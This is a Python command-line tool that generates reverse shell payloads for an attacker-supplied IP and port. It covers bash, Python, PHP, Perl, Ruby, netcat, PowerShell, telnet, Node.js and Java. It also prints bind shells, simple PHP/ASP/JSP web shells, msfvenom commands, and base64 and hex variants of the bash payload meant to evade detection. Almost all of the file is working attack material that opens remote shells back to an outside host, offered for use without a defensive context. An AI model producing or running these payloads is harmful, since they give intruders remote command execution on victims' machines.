#!/usr/bin/env python3
"""
Payload Generator Utility
Generates various reverse shell payloads for different scenarios
"""

import sys
import base64
import argparse
from urllib.parse import quote

def generate_bash_payload(ip, port):
    """Generate bash reverse shell"""
    return f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"

def generate_python_payload(ip, port):
    """Generate python reverse shell"""
    return f'''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\''''

def generate_php_payload(ip, port):
    """Generate PHP reverse shell"""
    return f'''<?php
$sock=fsockopen("{ip}",{port});
exec("/bin/sh -i <&3 >&3 2>&3");
?>'''

def generate_perl_payload(ip, port):
    """Generate Perl reverse shell"""
    return f'''perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' '''

def generate_ruby_payload(ip, port):
    """Generate Ruby reverse shell"""
    return f'''ruby -rsocket -e'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' '''

def generate_nc_payload(ip, port):
    """Generate Netcat reverse shell"""
    return f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f"

def generate_powershell_payload(ip, port):
    """Generate PowerShell reverse shell"""
    return f'''powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'''

def obfuscate_base64(payload):
    """Obfuscate payload with base64"""
    encoded = base64.b64encode(payload.encode()).decode()
    return f"echo {encoded} | base64 -d | bash"

def obfuscate_hex(payload):
    """Obfuscate payload with hex"""
    hex_encoded = payload.encode().hex()
    return f"echo {hex_encoded} | xxd -r -p | bash"

def obfuscate_url(payload):
    """URL encode payload"""
    return quote(payload)

def generate_all_payloads(ip, port, output_file=None):
    """Generate all payload types"""
    
    payloads = {
        "Bash": generate_bash_payload(ip, port),
        "Python": generate_python_payload(ip, port),
        "PHP": generate_php_payload(ip, port),
        "Perl": generate_perl_payload(ip, port),
        "Ruby": generate_ruby_payload(ip, port),
        "Netcat": generate_nc_payload(ip, port),
        "PowerShell": generate_powershell_payload(ip, port),
    }
    
    output = []
    output.append("="*80)
    output.append(f"REVERSE SHELL PAYLOADS FOR {ip}:{port}")
    output.append("="*80)
    output.append("")
    
    for name, payload in payloads.items():
        output.append(f"\n{'='*80}")
        output.append(f"{name} Reverse Shell:")
        output.append(f"{'='*80}")
        output.append(payload)
        
        if name == "Bash":
            output.append(f"\n[Base64 Obfuscated]:")
            output.append(obfuscate_base64(payload))
            
            output.append(f"\n[Hex Obfuscated]:")
            output.append(obfuscate_hex(payload))
            
            output.append(f"\n[URL Encoded]:")
            output.append(obfuscate_url(payload))
    
    # One-liners for common scenarios
    output.append(f"\n\n{'='*80}")
    output.append("COMMON ONE-LINERS:")
    output.append(f"{'='*80}")
    
    output.append(f"\n[Bash One-Liner with /dev/tcp]:")
    output.append(f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'")
    
    output.append(f"\n[Bash One-Liner with exec]:")
    output.append(f"0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196")
    
    output.append(f"\n[Telnet Reverse Shell]:")
    output.append(f"TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | sh 1>$TF")
    
    output.append(f"\n[PHP System Command]:")
    output.append(f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'")
    
    output.append(f"\n[Node.js Reverse Shell]:")
    output.append(f'''node -e 'require("child_process").exec("bash -c \\\'bash -i >& /dev/tcp/{ip}/{port} 0>&1\\\'")'  ''')
    
    output.append(f"\n[Java Reverse Shell]:")
    output.append(f'''r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[]); p.waitFor();''')
    
    # Bind shell alternatives
    output.append(f"\n\n{'='*80}")
    output.append("BIND SHELL ALTERNATIVES (Listen on Target):")
    output.append(f"{'='*80}")
    
    output.append(f"\n[Netcat Bind Shell on port {port}]:")
    output.append(f"nc -lvnp {port} -e /bin/bash")
    
    output.append(f"\n[Python Bind Shell on port {port}]:")
    output.append(f"python3 -c 'import socket,subprocess;s=socket.socket();s.bind((\"\",{port}));s.listen(1);c,a=s.accept();subprocess.call([\"/bin/sh\",\"-i\"],stdin=c.fileno(),stdout=c.fileno(),stderr=c.fileno())'")
    
    # Web shells
    output.append(f"\n\n{'='*80}")
    output.append("WEB SHELLS:")
    output.append(f"{'='*80}")
    
    output.append(f"\n[Simple PHP Web Shell]:")
    output.append(f"<?php system($_GET['cmd']); ?>")
    
    output.append(f"\n[PHP Web Shell with Output]:")
    output.append(f"<?php echo shell_exec($_GET['cmd']); ?>")
    
    output.append(f"\n[ASP Web Shell]:")
    output.append(f"<%@ Language=VBScript %><%eval request(\"cmd\")%>")
    
    output.append(f"\n[JSP Web Shell]:")
    output.append(f"<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>")
    
    # Metasploit payloads
    output.append(f"\n\n{'='*80}")
    output.append("METASPLOIT COMMANDS:")
    output.append(f"{'='*80}")
    
    output.append(f"\n[Linux x64 Reverse TCP]:")
    output.append(f"msfvenom -p linux/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf > shell.elf")
    
    output.append(f"\n[Windows x64 Reverse TCP]:")
    output.append(f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f exe > shell.exe")
    
    output.append(f"\n[PHP Reverse TCP]:")
    output.append(f"msfvenom -p php/reverse_php LHOST={ip} LPORT={port} -f raw > shell.php")
    
    output.append(f"\n[Python Reverse TCP]:")
    output.append(f"msfvenom -p python/shell_reverse_tcp LHOST={ip} LPORT={port} -f raw > shell.py")
    
    output.append("\n" + "="*80)
    
    result = "\n".join(output)
    
    # Print to console
    print(result)
    
    # Save to file if specified
    if output_file:
        with open(output_file, 'w') as f:
            f.write(result)
        print(f"\n✓ Payloads saved to: {output_file}")
    
    return result

def main():
    parser = argparse.ArgumentParser(
        description="Reverse Shell Payload Generator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -i 10.0.0.5 -p 4444
  %(prog)s -i 10.0.0.5 -p 4444 -o payloads.txt
  %(prog)s -i 10.0.0.5 -p 4444 -t bash
        """
    )
    
    parser.add_argument("-i", "--ip", required=True, 
                       help="Attacker IP address")
    parser.add_argument("-p", "--port", type=int, default=4444,
                       help="Listening port (default: 4444)")
    parser.add_argument("-o", "--output",
                       help="Save payloads to file")
    parser.add_argument("-t", "--type", 
                       choices=["bash", "python", "php", "perl", "ruby", "nc", "powershell", "all"],
                       default="all",
                       help="Payload type (default: all)")
    
    args = parser.parse_args()
    
    if args.type == "all":
        generate_all_payloads(args.ip, args.port, args.output)
    else:
        generators = {
            "bash": generate_bash_payload,
            "python": generate_python_payload,
            "php": generate_php_payload,
            "perl": generate_perl_payload,
            "ruby": generate_ruby_payload,
            "nc": generate_nc_payload,
            "powershell": generate_powershell_payload,
        }
        
        payload = generators[args.type](args.ip, args.port)
        print(f"\n{args.type.upper()} Payload:")
        print("="*80)
        print(payload)
        print("="*80)
        
        if args.output:
            with open(args.output, 'w') as f:
                f.write(payload)
            print(f"\n✓ Payload saved to: {args.output}")

if __name__ == "__main__":
    main()
